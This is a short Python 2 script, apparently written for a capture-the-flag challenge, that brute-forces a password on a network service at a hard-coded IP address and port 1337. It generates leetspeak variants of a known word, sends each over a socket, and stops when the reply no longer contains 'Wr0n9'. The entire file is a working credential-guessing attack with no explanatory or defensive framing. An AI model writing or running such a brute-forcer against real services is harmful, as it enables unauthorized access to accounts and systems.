import sys, socket, time

g = ['g', 'G', '6', '9']
u = ['U']
e = ['e', 'E', '3']
s = ['s', 'S', '5', '$']
t = ['t', 'T', '7', '+', '1']
r = ['r', 'R', '2']

host = "128.199.71.254"
port = 1337

start = False
# 9Ue$tU53r
with open("pass.txt", 'w') as f:
	for cg in g:
		for cu1 in u:
			for ce1 in e:
				for cs1 in s:
					for ct in t:
						if ce1 == '3' and cs1 == '5' and ct == 'T':
							start = True
						if not start:
							continue

						sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						sck.connect((host,port))
						time.sleep(1)
						print sck.recv(2024)
						
						for cu2 in u:
							for cs2 in s:
								for ce2 in e:
									for cr in r:
										passwd = cg+cu1+ce1+cs1+ct+cu2+cs2+ce2+cr+"\n"
										#f.write(passwd)
										print passwd
										sck.send(passwd)
										time.sleep(0.2)
										resp = sck.recv(2024)
										if 'Wr0n9' not in resp:
											print resp
											sys.exit(0)
										
						sck.close()
						time.sleep(0.6)